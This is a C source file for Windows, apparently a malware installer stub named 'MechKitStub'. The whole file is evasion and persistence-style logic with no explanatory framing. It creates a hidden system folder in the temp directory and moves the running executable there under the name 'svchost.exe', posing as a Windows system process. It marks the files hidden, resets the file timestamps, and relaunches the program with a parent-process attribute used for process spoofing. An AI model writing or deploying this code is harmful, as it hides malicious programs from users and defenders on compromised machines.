#include <windows.h>
#include <shlobj.h>
#include <stdio.h>

int MechKitStub(void) {
    char tempPath[MAX_PATH];
    char folderPath[MAX_PATH];
    char logPath[MAX_PATH];
    char exePath[MAX_PATH];
    char newExePath[MAX_PATH];

    if (GetTempPathA(MAX_PATH, tempPath) == 0) {
        return -1;
    }

    lstrcatA(tempPath, "MechKit");
    lstrcpyA(folderPath, tempPath);

    if (CreateDirectoryA(folderPath, NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
        SetFileAttributesA(folderPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

        lstrcpyA(logPath, folderPath);
        lstrcatA(logPath, "\\update.log");

        FILE* f = fopen(logPath, "w");
        if (f) {
            fclose(f);
            SetFileAttributesA(logPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        }

        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        lstrcpyA(newExePath, folderPath);
        lstrcatA(newExePath, "\\svchost.exe");

        MoveFileA(exePath, newExePath);
        SetFileAttributesA(newExePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

        HANDLE hFile = CreateFileA(newExePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            FILETIME ft;
            GetSystemTimeAsFileTime(&ft);
            SetFileTime(hFile, &ft, &ft, &ft);
            CloseHandle(hFile);
        }

        STARTUPINFOEXA si;
        PROCESS_INFORMATION pi;
        SIZE_T attrSize = 0;
        ZeroMemory(&si, sizeof(si));
        si.StartupInfo.cb = sizeof(si);

        InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
        si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
        InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

        HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
        UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

        CreateProcessA(newExePath, NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFOA)&si, &pi);

        DeleteProcThreadAttributeList(si.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        CloseHandle(hParent);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        return 0xDEAD;
    }

    return -2;
}
